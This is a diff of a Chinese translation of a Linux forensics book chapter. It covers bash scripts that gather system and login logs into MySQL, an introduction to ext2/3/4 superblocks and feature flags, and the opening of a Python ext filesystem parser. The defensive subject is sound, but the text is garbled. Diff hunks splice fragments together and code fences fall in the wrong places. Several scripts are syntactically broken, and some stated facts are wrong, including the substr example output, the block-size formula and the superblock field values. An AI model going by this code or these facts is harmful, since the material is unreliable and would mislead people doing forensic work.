-作为调查的一部分，我们可能想要查看各种系统日志文件。这些文件位于 /var/log 下。正如我们之前讨论过的，某些日志位于子目录中，另一些位于主 /var/log 目录。除了少数例外外，这些都是文本日志。某些格式为 <base log file>.n（其中 n 是整数）的存档，且较旧的存档可能使用 gzip 压缩。这导致了 syslog、syslog.1、syslog.2.gz、syslog.3.gz 等日志文件的创建。
+作为调查的一部分，我们可能想要查看各种系统日志文件。这些文件位于 `/var/log` 下。正如我们之前讨论过的，某些日志位于子目录中，另一些位于主 `/var/log` 目录。除了少数例外外，这些都是文本日志。某些格式为 `<base log file>.n`（其中 n 是整数）的存档，且较旧的存档可能使用 `gzip` 压缩。这导致了 `syslog`、`syslog.1`、`syslog.2.gz`、`syslog.3.gz` 等日志文件的创建。
 
 与第 3 章中的脚本非常类似的脚本允许我们捕获日志文件进行分析。使用前面的章节中的脚本，我们只捕获当前日志。如果存档日志可能与调查有关，以后可以随时从镜像中获取。我们的脚本如下。
 
 ```bash
 #!/bin/bash
-
 ### get-logfiles.sh
-
 # 用于获取所有日志并可选
 # 存储在数据库中的简单脚本。
 # 警告：此脚本运行可能需要很长时间！
 # 由 Phil Polstra 博士 (@ppolstra) 开发，用于
 ### PentesterAcademy.com。
-
 usage() {
   echo "usage: $0 <point of root> [database name]"
   echo "Simple script to get log files and"
   echo "optionally store them to a database."
   exit 1}
-
 if [ $# -lt 1 ]; then
   usage
 fi
-
 # 如果旧文件存在则将其删除
 if [ -f /tmp/logfiles.csv ]; then
   rm /tmp/logfiles.csv
 fi
-
 # 只查找文件，排除带有数字的文件，因为它们是旧日志
 # 对找到的所有文件执行 echo, cat, 和 echo
 olddir=$(pwd)
@@ -3481,7 +3935,6 @@ cd $olddir
 if [ $# -gt 1 ]; then
   chown mysql:/tmp/logfiles.csv
 fi
-
 echo "Let's put that in the database"
 cat << EOF | mysql $2 -u root -p
 create table if not exists logs (
@@ -3490,16 +3943,11 @@ create table if not exists logs (
   recno bigint not null auto_increment,
   primary key(recno)
 );
-
 load data infile "/tmp/logfiles.csv"
 into table logs
 fields terminated by ';'
 EOF
 ```
-
-
-
-
 
 ```bash
 echo "and and unsuccessful logins."
@@ -3513,27 +3961,29 @@ fi
 # use sed to strip white space
 echo "who-what:terminal-event;start;stop;elapsedTime;" \
   | tee /tmp/logins.csv
+```
+
+
+
+```bash
 for logfile in $1/var/log/wtmp*
 do
   last -aiFwx -f $logfile \
   awk '{print substr($0, 1, 8) "\"; substr($0, 10, 13) "\";' \ \
     substr($0, 23, 24) "\"; substr($0, 50, 24)
 ```
-
 ```sql
 stop datetime,
 elapsed varchar(12),
 ip varchar(15),
 recno bigint not null auto_increment,
 primary key(recno);
-
 load data infile "/tmp/logins.csv"
 to table logins
 fields terminated by ';'
 enclosed by '"'
 lines terminated by '\n'
 ignore 1 rows
-
 (who_what, terminal_event, @start, @stop, elapsed, ip)
 set start=str_to_date(start, "%a %b e %H:%i:%s %Y");
 stop=str_to_date(@stop, "%a %b e %H:%i:%s %Y");
@@ -3546,14 +3996,12 @@ elapsed varchar(12),
 ip varchar(15),
 recno bigint not null auto_increment,
 primary key(recno));
-
 load data infile "/tmp/login-fails.csv"
 to table login_fails
 fields terminated by ';'
 enclosed by '"'
 lines terminated by '\n'
 ignore 1 rows
-
 (who_what, terminal_event, @start, @stop, elapsed, ip)
 set start=str_to_date(start, "%a %b e %H:%i:%s %Y");
 stop=str_to_date(@stop, "%a %b e %H:%i:%s %Y");
@@ -3561,11 +4009,11 @@ stop=str_to_date(@stop, "%a %b e %H:%i:%s %Y");
 
 该脚本以通常的方式启动，在 `logfile in $1/var/log/wtmp*` 这一行之前非常简单。这是我们的第一个项。Bash 支持循环的多种变体。熟悉 C 和类似编程语言的读者已经见过 `for` 循环，这种循环通常用于遍历列表，其中迭代次数是预先知道的，并且在循环每一步都会递增（或递减）整数。Bash 支持这些类型的循环，还允许创建一个遍历匹配模式的文件的循环。
 
-我们 `for` 循环中的模式将匹配登录日志文件 (wtmp) 以及任何相同的归档。下一行的 `do` 开始循环的代码块，七行后的 `done` 终止该循环。最后一个命令很直观，但紧随其后的一系列管道操作则不然了。按照惯例，将这个长命令拆分为子部分会更容易理解代码。
+我们 `for` 循环中的模式将匹配登录日志文件 `wtmp` 以及任何相同的归档。下一行的 `do` 开始循环的代码块，七行后的 `done` 终止该循环。最后一个命令很直观，但紧随其后的一系列管道操作则不然了。按照惯例，将这个长命令拆分为子部分会更容易理解代码。
 
 在之前的脚本中，我们已经见过 `awk`，包括使用位置参数作为 `$0` 和 `$1`。然而，`substr` 函数是新的。其格式为 `substr(some string, <starting index>, <max length>)`。例如，`substr("Hello there",1,4)` 将返回 "Hello"。注意，在许多其他语言和程序中，索引是从 1 开始的，而不是从 0。一旦你理解了 `substr` 如何工作，就会发现那条 `awk` 命令正在打印来自 `last` 的六个输出字段，并用分号分隔。这些字段包含了条目所指的内容、该条目对应的终端或事件、开始时间、经过时间和 IP 地址。
 
-`last` 的格式化输出仍然存在一个小问题，即：在每个条目的分号之前有很多空格。这时 `sed` 编辑器介入了。`sed` 最常用的命令之一是替换命令，其格式为 `s/<search pattern>/<replacement pattern>/<options>`。`/` 是传统的分隔符，但用户可以使用不同的字符（`|` 是一个常见的选择）。`sed s[:space:]]*///g` 用于搜索分号前的零或多个空格，并将其替换为空，全局替换（使用 `g` 选项），这意味着匹配每行的第一项。第二个 `sed` 命令 `sed s[:space:]]+//g` 移除每行末尾的空格（IP）。这段代码与 `wtmp` 代码的处理逻辑相同。数据库代码与我们之前使用的类似。再次，唯一的复杂之处是将 `last` 的日期和时间输出格式化为 MySQL 的 datetime 对象。运行该脚本的某些输出如图 25 所示。注意 `last` 和 `lastb` 会生成空行，说明日志文件已创建。这会导致你的数据库中出现错误的条目。我的哲学是忽略这些条目，而不是向脚本中添加大量的复杂逻辑。
+`last` 的格式化输出仍然存在一个小问题，即：在每个条目的分号之前有很多空格。这时 `sed` 编辑器介入了。`sed` 最常用的命令之一是替换命令，其格式为 `s/<search pattern>/<replacement pattern>/<options>`。`/` 是传统的分隔符，但用户可以使用不同的字符（`|` 是一个常见的选择）。`sed s[:space:]]*///g` 用于搜索分号前的零或多个空格，并将其替换为空，全局替换（使用 `g` 选项），这意味着匹配每行的第一项。第二个 `sed` 命令 `sed s[:space:]]+//g` 移除每行末尾的空格（IP）。这段代码与 `wtmp` 代码的处理逻辑相同。数据库代码与我们之前使用的类似。再次，唯一的复杂之处是将 `last` 的日期和时间输出格式化为 MySQL 的 `datetime` 对象。运行该脚本的某些输出如图 25 所示。注意 `last` 和 `lastb` 会生成空行，说明日志文件已创建。这会导致你的数据库中出现错误的条目。我的哲学是忽略这些条目，而不是向脚本中添加大量的复杂逻辑。
 
 | 日期 | 时间 | 用户 | 源 IP | 状态 |
 | --- | --- | --- | --- | --- |
@@ -3579,19 +4027,24 @@ stop=str_to_date(@stop, "%a %b e %H:%i:%s %Y");
 
 ```bash
 #!/bin/bash
+
 usage () {
   echo "usage: $0 <mount point> [database name]"
   exit 1
 }
+
 if [ $# -lt 1 ]; then
   usage
 fi
+
 # 如果旧文件存在则将其删除
 if [ -f /tmp/logfiles.csv ]; then
   rm /tmp/logfiles.csv
 fi
+
 olddir=$(pwd)
 cd $1/var
+
 for logfile in $(find . -type f -name '*'); do
   if echo $logfile | grep -q ".gz$"; then
     zcat $logfile | awk '{ print "\$logfile\" \$0 }' \
@@ -3601,26 +4054,33 @@ for logfile in $(find . -type f -name '*'); do
     | tee -a /tmp/logfiles.csv
   fi
 done
+
 cd "$olddir"
+
 if [ -gt 1 ]; then
 # 后面是数据库逻辑...
 ```
 
 ```bash
 #!/bin/bash
+
 usage () {
   echo "usage: $0 <mount point> [database name]"
   exit 1
 }
+
 if [ $# -lt 1 ]; then
   usage
 fi
+
 # 如果旧文件存在则将其删除
 if [ -f /tmp/logfiles.csv ]; then
   rm /tmp/logfiles.csv
 fi
+
 olddir=$(pwd)
 cd $1/var
+
 for logfile in $(find . -type f -name '*'); do
   if echo $logfile | grep -q ".gz$"; then
     zcat $logfile | awk '{ print "\$logfile\" \$0 }' \
@@ -3630,7 +4090,9 @@ for logfile in $(find . -type f -name '*'); do
     | tee -a /tmp/logfiles.csv
   fi
 done
+
 cd "$olddir"
+
 if [ -gt 1 ]; then
   chown mysql:mysql /tmp/logfiles.csv
   clear
@@ -3640,27 +4102,38 @@ if [ -gt 1 ]; then
     logFilename varchar(2048) not null,
     logentry varchar(2048) not null,
     recno bigint not null auto_increment,
+
+
+
+```
     primary key(recno)
+
   );
+
   fi
+
   load data infile "/tmp/logfiles.csv"
+
   into table logs
+
   fields terminated by ';'
+
   enclosed by ''
+
   lines terminated by '\n'
+
 EOF
+
 fi
 ```
+
+
 
 图 26：运行该脚本针对目标系统的输出。
 
 ### 总结
 
 在本章中，我们学习了如何从挂载的目标文件系统或文件系统提取信息。我们展示了许多在 LibreOffice 或如 MySQL 等数据库中对这些数据分析的方法。在下一章中，我们将深入研究 Linux 扩展文件系统，这允许我们检测被攻击者篡改的数据。
-
-
-
-
 
 ### 第7章
 
@@ -3680,19 +4153,19 @@ fi
 
 ### 扩展文件系统基础
 
-运行 Linux 也有很多选择。这包括你对文件系统的选择。尽管如此，绝大多数 Linux 系统都使用了某种版本的 Linux 扩展文件系统。这些通常被称为 extN 文件系统，其中 N 是版本号（通常为 2、3 或 4）。ext2 文件系统对于不经常变化的分区（如启动分区）非常流行。绝大多数 Linux 发行版在通用文件系统（如 `/`、`/home`、`/usr`、`/opt` 等）上默认使用 ext4。
+运行 Linux 也有很多选择。这包括你对文件系统的选择。尽管如此，绝大多数 Linux 系统都使用了某种版本的 Linux 扩展文件系统。这些通常被称为 extN 文件系统，其中 N 是版本号（通常为 2、3 或 4）。`ext2` 文件系统对于不经常变化的分区（如启动分区）非常流行。绝大多数 Linux 发行版在通用文件系统（如 `/`、`/home`、`/usr`、`/opt` 等）上默认使用 `ext4`。
 
-自然的问题是，扩展文件系统是在什么基础上扩展而来的？答案是 Unix 文件系统 (UFS)。虽然 extN 族是 UFS 的扩展，但它也是一种简化。UFS 中的某些特性对现代介质不再适用，因此它们被删除了以简化代码并提高性能。extN 族旨在具有良好的健壮性和性能。
+自然的问题是，扩展文件系统是在什么基础上扩展而来的？答案是 Unix 文件系统 (`UFS`)。虽然 extN 族是 UFS 的扩展，但它也是一种简化。UFS 中的某些特性对现代介质不再适用，因此它们被删除了以简化代码并提高性能。extN 族旨在具有良好的健壮性和性能。
 
-ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是日志文件系统，但 ext2 是非日志文件系统。什么是日志？在这种语境下，它不是对个人生活经历的记录。相反，日志被用于提高性能并减少数据损坏的概率。
+`ext2` 通常被保留给静态文件系统是有原因的。`ext3` 和 `ext4` 都是日志文件系统，但 `ext2` 是非日志文件系统。什么是日志？在这种语境下，它不是对个人生活经历的记录。相反，日志被用于提高性能并减少数据损坏的概率。
 
-以下是日志文件系统的工作原理。对介质的写入不会立即完成，而是将请求的更改写入日志中。当命令返回时，意味着要么整个事务已完成（所有数据已写入或更新），在这种情况下返回成功；如果命令无法成功完成，则文件系统将恢复到之前的状态。在计算机没有正常关机的情况下，可以使用日志将内容恢复到一致状态。拥有日志文件系统可以显著加快文件系统检查 (fsck) 过程。
+以下是日志文件系统的工作原理。对介质的写入不会立即完成，而是将请求的更改写入日志中。当命令返回时，意味着要么整个事务已完成（所有数据已写入或更新），在这种情况下返回成功；如果命令无法成功完成，则文件系统将恢复到之前的状态。在计算机没有正常关机的情况下，可以使用日志将内容恢复到一致状态。拥有日志文件系统可以显著加快文件系统检查 (`fsck`) 过程。
 
-扩展文件系统将信息存储在块中，块组织成块组 (block groups)。块的大小通常为 1024、2048 或 4096 字节。大多数介质遇到的是 512 字节扇区。因此，块的长度为 2、4 或 8 个扇区。对于熟悉 FAT 和 NTFS 文件系统的读者来说，Unix 或 Linux 中的一个块相当于 DOS 或 Windows 中的一个簇 (cluster)。块是磁盘空间最小的分配单元。
+扩展文件系统将信息存储在块中，块组织成块组 (`block groups`)。块的大小通常为 1024、2048 或 4096 字节。大多数介质遇到的是 512 字节扇区。因此，块的长度为 2、4 或 8 个扇区。对于熟悉 FAT 和 NTFS 文件系统的读者来说，Unix 或 Linux 中的一个块相当于 DOS 或 Windows 中的一个簇 (`cluster`)。块是磁盘空间最小的分配单元。
 
-图 7.1 显示了块组的通用结构。请记住，每个元素都会出现在每个块组中。我们在本章稍后将看到 ext4 文件系统是高度自定义的。为了提高性能，某些元素可能会从特定组中移动或消除。
+图 7.1 显示了块组的通用结构。请记住，每个元素都会出现在每个块组中。我们在本章稍后将看到 `ext4` 文件系统是高度自定义的。为了提高性能，某些元素可能会从特定组中移动或消除。
 
-我们将在本章稍后详细描述图 7.1 中的每个元素。现在，我将提供这些项目的一些基本定义。启动块 (boot block) 正如其名，操作系统的启动代码。这可能用于现代系统，但为了向后兼容，仍然要求存在那里。超数据块 (superblock) 描述文件系统并告诉操作系统寻找各种元素（节点等）。组描述符描述每个块组的布局。节点（inodes，index nodes 的缩写）包含文件除名称以外的所有元数据。数据块用于存储文件和目录。位图 (bitmaps) 指明哪些节点和数据块处于占用状态。
+我们将在本章稍后详细描述图 7.1 中的每个元素。现在，我将提供这些项目的一些基本定义。启动块 (`boot block`) 正如其名，操作系统的启动代码。这可能用于现代系统，但为了向后兼容，仍然要求存在那里。超数据块 (`superblock`) 描述文件系统并告诉操作系统寻找各种元素（节点等）。组描述符描述每个块组的布局。节点（`inodes`，index nodes 的缩写）包含文件除名称以外的所有元数据。数据块用于存储文件和目录。位图 (`bitmaps`) 指明哪些节点和数据块处于占用状态。
 
 | 启动块 | 块组 0 | 块组 N-1 |
 | :--- | :--- | :--- |
@@ -3703,23 +4176,23 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 
 扩展文件系统允许可选特性。这些特性分为三类：兼容、不兼容和只读兼容。如果操作系统不支持某个兼容特性，文件系统仍然可以安全地挂载。相反，如果操作系统缺乏对不兼容特性的支持，不应挂载该文件系统。当操作系统为只读兼容列表提供特性时，挂载文件系统是安全的，但仅限于只读方式挂载。如果你发现自己正在检查怀疑的攻击者的计算机，要记住他她可能正在使用非标准的扩展特性。
 
-由 Brian Carrier 开发的 Sleuth Kit (TSK) 是一套用于文件系统分析的工具。其中工具 `fsstat` 允许你收集文件系统 (fs) 统计信息 (stat)。需要警告的是，该工具似乎有些过时，可能无法正确显示你最新版本 ext4 文件系统的所有特性。别担心，我们将在本章开发一些最新的脚本，它们将妥善处理截至目前的版本的 ext4（此外，你将拥有可以自己更新的 Python 代码）。
+由 Brian Carrier 开发的 Sleuth Kit (`TSK`) 是一套用于文件系统分析的工具。其中工具 `fsstat` 允许你收集文件系统 (`fs`) 统计信息 (`stat`)。需要警告的是，该工具似乎有些过时，可能无法正确显示你最新版本 `ext4` 文件系统的所有特性。别担心，我们将在本章开发一些最新的脚本，它们将妥善处理截至目前的版本的 `ext4`（此外，你将拥有可以自己更新的 Python 代码）。
 
 为了运行 `fsstat`，你必须先知道文件系统在镜像文件中的偏移量。回想我们在第 5 章中学过，可以使用 `fdisk` 工具来确定此偏移量。该命令的语法简单为 `fdisk <image file>`。如图 7.2 所示，PFE 镜像中的文件系统从扇区 2048 开始。
 
 ![](img/7abfab28a493757db3f096946a95ec01_189_0.png)  
 
-**图 7.2** 使用 fdisk 确定文件系统起始的偏移量。
+**图 7.2** 使用 `fdisk` 确定文件系统起始的偏移量。
 
-一旦确定了偏移量，显示文件系统统计信息的命令就是 `fsstat -o <offset> <image file>`，即 `fsstat -o 2048 pfel.img`。对我们的 PFE 主体镜像运行此命令的局部结果如图 7.3 和图 7.4 所示。图 7.3 的结果显示我们有一个已正确卸载的 ext4 文件系统，它曾挂载在 `/`，具有 1,048,577 个节点和 4,194,048 KiB 块。截图中也显示了兼容、不兼容和只读兼容特性。从图 7.4 我们可以看到有128 个块组，每组有 8,192 个节点和 32,768 个块。我们还看到了前两个组的统计信息。
+一旦确定了偏移量，显示文件系统统计信息的命令就是 `fsstat -o <offset> <image file>`，即 `fsstat -o 2048 pfel.img`。对我们的 PFE 主体镜像运行此命令的局部结果如图 7.3 和图 7.4 所示。图 7.3 的结果显示我们有一个已正确卸载的 `ext4` 文件系统，它曾挂载在 `/`，具有 1,048,577 个节点和 4,194,048 KiB 块。截图中也显示了兼容、不兼容和只读兼容特性。从图 7.4 我们可以看到有128 个块组，每组有 8,192 个节点和 32,768 个块。我们还看到了前两个组的统计信息。
 
 ![](img/7abfab28a493757db3f096946a95ec01_190_0.png)  
 
-**图 7.3** fsstat 的结果 - 部分 1。
+**图 7.3** `fsstat` 的结果 - 部分 1。
 
 ![](img/7abfab28a493757db3f096946a95ec01_190_1.png)  
 
-**图 7.4** fsstat 的结果 - 部分 2。
+**图 7.4** `fsstat` 的结果 - 部分 2。
 
 ## 超数据块
 
@@ -3738,11 +4211,7 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 - 文件系统挂载路径
 - 文件系统状态（是否正常卸载）
 
-在检查文件系统时，使用专门为此目的设计的十六进制编辑器可能会非常方便。此类编辑器是 Lsoft 的 Active@ Disk Editor。它是免费提供的，并且有 Linux 版本（以及 Windows 版本）。Active@ Disk Editor (ADE) 可以从 http://disk-editor.org 下载。ADE 具有许多很好的功能，包括解释常用文件系统结构（如超数据块和节点）的模板。目标系统的超数据块如图 7.5 中的 ADE 所示。我们将在本章稍后讨论各种文件系统特性时，详细介绍图 7.5 中的字段。目前，我认为：块大小（超数据块中偏移量 18）存储为 x，其中字节单位的块大小 = 2^(10 * x) = 1024 * 2。例如，存储的块大小为 2 对应 4 KB (4096 字节) 的块。表 7.1 总结了截至本文超数据块中可能存在的所有字段。表 7.1 的材料主要来自头文件 /usr/src/<linux version>/fs/ext4/ext4.h。
-
-
-
-
+在检查文件系统时，使用专门为此目的设计的十六进制编辑器可能会非常方便。此类编辑器是 Lsoft 的 Active@ Disk Editor。它是免费提供的，并且有 Linux 版本（以及 Windows 版本）。Active@ Disk Editor (`ADE`) 可以从 http://disk-editor.org 下载。`ADE` 具有许多很好的功能，包括解释常用文件系统结构（如超数据块和节点）的模板。目标系统的超数据块如图 7.5 中的 `ADE` 所示。我们将在本章稍后讨论各种文件系统特性时，详细介绍图 7.5 中的字段。目前，我认为：块大小（超数据块中偏移量 18）存储为 x，其中字节单位的块大小 = 2^(10 * x) = 1024 * 2。例如，存储的块大小为 2 对应 4 KB (4096 字节) 的块。表 7.1 总结了截至本文超数据块中可能存在的所有字段。表 7.1 的材料主要来自头文件 `/usr/src/<linux version>/fs/ext4/ext4.h`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_192_0.png)
 
@@ -3856,7 +4325,7 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 
 # 兼容性特性
 
-兼容性特性本质上是锦上添花的。换句话说，如果你支持此特性，那太棒了；如果不支持，请随时以可读写方式挂载使用文件系统。虽然你可以挂载此文件系统，但你不应该对其运行 fsck（文件系统检查）工具，因为你可能会破坏与这些可选特性相关的内容。本文目前的兼容性特性列表总结在表 7.2 中。
+兼容性特性本质上是锦上添花的。换句话说，如果你支持此特性，那太棒了；如果不支持，请随时以可读写方式挂载使用文件系统。虽然你可以挂载此文件系统，但你不应该对其运行 `fsck`（文件系统检查）工具，因为你可能会破坏与这些可选特性相关的内容。本文目前的兼容性特性列表总结在表 7.2 中。
 
 表 7.2 兼容性特性。
 
@@ -3873,12 +4342,9 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 | 0x100 | Exclude Bitmap | 不常见 |
 | 0x200 | Sparse Super2 | 如果设置，superblock_bgs 指向包含超级块备份的 2 个块组 |
 
-
-
-
 表 7.2 中的第一个功能是**目录预分配**（Directory Preallocation）。当启用此功能时，操作系统在每次创建目录时都会分配一些空间。这样做是为了防止目录碎片，从而提高性能。虽然这很有用，但很容易理解为什么即使操作系统不支持这种优化，维护文件系统也是没有问题的。
 
-如果文件系统具有日志（journal），则设置第 2 位（值为 0x04）。对于 ext3 和 ext4 文件系统，此位应始终被设置。这是一个兼容性功能，因为如果你不是通过日志进行读写，那么读写文件系统在某种程度上是安全的。
+如果文件系统具有日志（journal），则设置第 2 位（值为 0x04）。对于 `ext3` 和 `ext4` 文件系统，此位应始终被设置。这是一个兼容性功能，因为如果你不是通过日志进行读写，那么读写文件系统在某种程度上是安全的。
 
 如果内核支持扩展属性，则设置第 4 位（值为 0x08）。扩展属性的首次用法是访问控制列表（ACL）。还支持其他类型的扩展属性，包括用户指定的。我们将在本章节后面学习更多关于扩展属性的内容。
 
@@ -3892,13 +4358,13 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 
 现在我们已经学习了所有的兼容性功能，我们可能会问哪些功能影响我们的数据布局。该类别中影响文件系统布局的两个功能是**节点调整**和**稀疏 2**，它们分别在组描述符表中添加空间，并缓存超级块备份以将其从除两个组以外的所有组中移除。
 
-如何从 Linux 扩展文件系统中获取功能和其他信息？意不意外的是，有很多工具可用。第一个工具是 `stat`（统计）命令，它通常用于文件，但也可以用于文件系统。在普通文件上运行此命令的语法为 `stat <filename>`，例如 `stat *.mp3`。在某些 MP3 文件上运行 stat 的结果如图 7.7 所示。在文件系统上运行 stat 的命令是 `stat -f <point>`，例如 `stat -f /`。我的笔记本电脑上运行 `stat -f /` 的输出如图 7.8 所示。注意，显示了文件系统 ID、类型、块大小、总/空闲/可用块，以及总/空闲 inode。
+如何从 Linux 扩展文件系统中获取功能和其他信息？意不意外的是，有很多工具可用。第一个工具是 `stat`（统计）命令，它通常用于文件，但也可以用于文件系统。在普通文件上运行此命令的语法为 `stat <filename>`，例如 `stat *.mp3`。在某些 MP3 文件上运行 `stat` 的结果如图 7.7 所示。在文件系统上运行 `stat` 的命令是 `stat -f <point>`，例如 `stat -f /`。我的笔记本电脑上运行 `stat -f /` 的输出如图 7.8 所示。注意，显示了文件系统 ID、类型、块大小、总/空闲/可用块，以及总/空闲 inode。
 
 ![](img/7abfab28a493757db3f096946a95ec01_200_0.png)
 
 图 7.7
 
-在普通文件上运行 stat 命令。
+在普通文件上运行 `stat` 命令。
 
 ![](img/7abfab28a493757db3f096946a95ec01_200_1.png)
 
@@ -3906,45 +4372,57 @@ ext2 通常被保留给静态文件系统是有原因的。ext3 和 ext4 都是�
 
 与 `stat` 命令一样，`file` 命令也可以应用于文件或文件系统。在文件上运行时，`file` 命令将显示文件类型。在决定如何处理文件方面，Linux 比 Windows 小得多。Linux 会查看文件内部的文件签名，而 Windows 只使用文件扩展名来确定如何处理。在图 7.7 的 MP3 文件上运行 `file` 的结果如图 7.9 所示。在磁盘设备上运行时，应使用 `-s`（特殊文件）和 `-L`（跟踪链接）选项。图 7.10 显示了我的笔记本电脑上运行 `file -sl /dev/sd*` 的结果。
 
-```
-root@i7laptop:~/Videos# file *.mp3
+
+
+`root@i7laptop:~/Videos# file *.mp3`
+
 HDV 0081.mp3: MPEG ADTS, layer III, v1, 128 kbps, 48 kHz, JointStereo
+
 HDV 0083.mp3: MPEG ADTS, layer III, v1, 128 kbps, 48 kHz, JointStereo
+
 HDV 0084.mp3: MPEG ADTS, layer III, v1, 128 kbps, 48 kHz, JointStereo
+
 HDV 0085.mp3: MPEG ADTS, layer III, v1, 128 kbps, 48 kHz, JointStereo
+
 the marines hymn.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JointStereo
-root@i7laptop:~/Videos# 
-```
+
+`root@i7laptop:~/Videos#`
 
 # 图 7.9
 
-在 i7laptop:~/Videos 上针对普通文件运行 `file` 命令的输出。
+在 `i7laptop:~/Videos` 上针对普通文件运行 `file` 命令的输出。
 
 ```
 root@i7laptop:~/Videos# file -sl /dev/sd*
-/dev/sda1: Linux partition, GPT table, LFS root, size 50 GiB, type Linux ext4 data
-/dev/sda2: Linux partition, GPT table, LFS swap, size 8.0 GiB, type Linux swap-data
-/dev/sda3: Linux partition, GPT table, LFS home, size 200 GiB, type Linux ext4 data
-/dev/sda4: Linux partition, GPT table, LFS backup, size 100 GiB, type Linux ext4 data
-/dev/sda5: Linux partition, GPT table, LFS media, size 500 GiB, type Linux ext4 data
-/dev/sda6: Linux partition, GPT table, LFS games, size 300 GiB, type Linux ext4 data
-/dev/sda7: Linux partition, GPT table, LFS projects, size 150 GiB, type Linux ext4 data
-/dev/sda8: Linux partition, GPT table, LFS work, size 100 GiB, type Linux ext4 data
-/dev/sda9: Linux partition, GPT table, LFS test, size 50 GiB, type Linux ext4 data
 ```
+
+`/dev/sda1`: Linux partition, GPT table, LFS root, size 50 GiB, type Linux ext4 data
+
+`/dev/sda2`: Linux partition, GPT table, LFS swap, size 8.0 GiB, type Linux swap-data
+
+`/dev/sda3`: Linux partition, GPT table, LFS home, size 200 GiB, type Linux ext4 data
+
+`/dev/sda4`: Linux partition, GPT table, LFS backup, size 100 GiB, type Linux ext4 data
+
+`/dev/sda5`: Linux partition, GPT table, LFS media, size 500 GiB, type Linux ext4 data
+
+`/dev/sda6`: Linux partition, GPT table, LFS games, size 300 GiB, type Linux ext4 data
+
+`/dev/sda7`: Linux partition, GPT table, LFS projects, size 150 GiB, type Linux ext4 data
+
+`/dev/sda8`: Linux partition, GPT table, LFS work, size 100 GiB, type Linux ext4 data
+
+`/dev/sda9`: Linux partition, GPT table, LFS test, size 50 GiB, type Linux ext4 data
 
 # 图 7.10
 
 从图 7.10 可以看出 Linux 具有日志功能、使用区（extents）并支持大文件。这些功能将在本章节后面进行详细描述。
 
-
-
-
 元块组（Meta Block Group）将文件系统分为许多元块组，其大小使得组描述符可以存储在单个块中。这使得大于 256 TB 的文件系统变得可用。
 
 区范围（Extents）功能允许更高效地处理大文件。区范围与 NTFS 的数据运行（data runs）类似，它们都允许更高效地存储和访问大文件。本章稍后部分将详细讨论区范围。
 
-64位功能将最大块数从 $2^{32}$ 增加到 $2^{64}$。这并不是一个常见的功能，因为 32 位模式支持多达 256 PB 的文件系统。它在需要较小块大小的场景中更为常见，例如存储大量小文件的服务器。
+64位功能将最大块数从 `$2^{32}$` 增加到 `$2^{64}$`。这并不是一个常见的功能，因为 32 位模式支持多达 256 PB 的文件系统。它在需要较小块大小的场景中更为常见，例如存储大量小文件的服务器。
 
 多重挂载保护（Multiple Mount Protection）功能用于检测是否有多个操作系统或进程正在使用某个文件系统。当启用此功能时，任何尝试挂载已挂载文件系统的操作将失败。作为双重检查，系统会定期重新检查挂载状态（序列号），如果操作系统检测到另一个系统挂载了该文件系统，则文件系统将保持为只读状态。
 
@@ -3988,13 +4466,11 @@ root@i7laptop:~/Videos# file -sl /dev/sd*
 
 Btree 目录功能允许大目录存储在二叉树中。这并不常见。另一个与大目录相关的特性是目录链接数（Directory Nlink）。当设置 Nlink 标志时，子目录的条目数不限于 32k 个。
 
-
-
-
 遍历了大部分代码，但并非所有代码。关于格式的说明：原本位于行尾的许多注释已移动到行上方，以便使书中的代码更易读。
 
 ```python
 #!/usr/bin/python
+
 #
 # extfs.py
 #
@@ -4009,25 +4485,35 @@ import os.path
 import subprocess
 import struct
 import time
-
 # 这些是为了方便转换的简单函数
+```
+
+
+
+```python
 def getu32(data, offset=0):
     return struct.unpack('<L', data[offset:offset+4])[0]
+
 def getu16(data, offset=0):
     return struct.unpack('<H', data[offset:offset+2])[0]
+
 def getu8(data, offset=0):
     return struct.unpack('B', data[offset:offset+1])[0]
+
 def getu64(data, offset=0):
     return struct.unpack('<Q', data[offset:offset+8])[0]
+
 # 此函数不解包字符串，因为
 # 它不是真正的数字而是一个 UUID
 def getu128(data, offset=0):
     return data[offset:offset+16]
+
 def printUuid(data):
     retStr = \
     format(struct.unpack('<Q', data[8:16])[0], 'X').zfill(16) + \
     format(struct.unpack('<Q', data[0:8])[0], 'X').zfill(16)
     return retStr
+
 def getCompatibleFeaturesList(u32):
     retList = []
     if u32 & 0x1:
@@ -4051,6 +4537,7 @@ def getCompatibleFeaturesList(u32):
     if u32 & 0x200:
         retList.append('Sparse Super 2')
     return retList
+
 def getIncompatibleFeaturesList(u32):
     retList = []
     if u32 & 0x1:
@@ -4084,6 +4571,7 @@ def getIncompatibleFeaturesList(u32):
     if u32 & 0x10000:
         retList.append('Encrypted Inodes')
     return retList
+
 def getReadOnlyCompatibleFeaturesList(u32):
     retList = []
     if u32 & 0x1:
@@ -4113,6 +4601,7 @@ def getReadOnlyCompatibleFeaturesList(u32):
     if u32 & 0x1000:
         retList.append('Read-only')
     return retList
+
 # 此 Superblock 将解析 superblock中的数据
 class Superblock:
     def __init__(self, data):
@@ -4131,143 +4620,262 @@ class Superblock:
         # 如果启用 bigalloc
         self.clustersPerGroup = getu32(data, 0x24)
         self.inodesPerGroup = getu32(data, 0x28)
-        self.mountTime = time.ctime(getu32(data, 0x2c))
-        self.writeTime = time.ctime(getu32(data, 0x30))
-        # 自 fsck 以来的挂载次数
-        self.mountCount = getu16(data, 0x34)
-        # fsck 之间的挂载次数
-        self.maxMountCount = getu16(data, 0x36)
-        self.magic = getu16(data, 0x38) # 应为 0xef530001/0002/0004 =干净卸载/错误/孤立节点
-        self.state = getu16(data, 0xa)
-        # 错误 1/2/3 继续/只读
-        self.errors = getu16(data, 0x3c)
-        self.minRevision = getu16(data, 0x3e)
-        # 上次 fsck 时间
-        self.lastCheck = time.ctime(getu32(data, 0x40))
-        # 检查间隔秒
-        self.checkInterval = getu32(data, 0x44)
-        # 0/1/2/3/4 Linux/Hard/FreeBSD
-        self.creatorOs = getu32(data, 0x48)
-        # v2 动态 inode 大
-        self.revisionLevel = getu32(data, 0x4c)
-        # 预留块的 UID
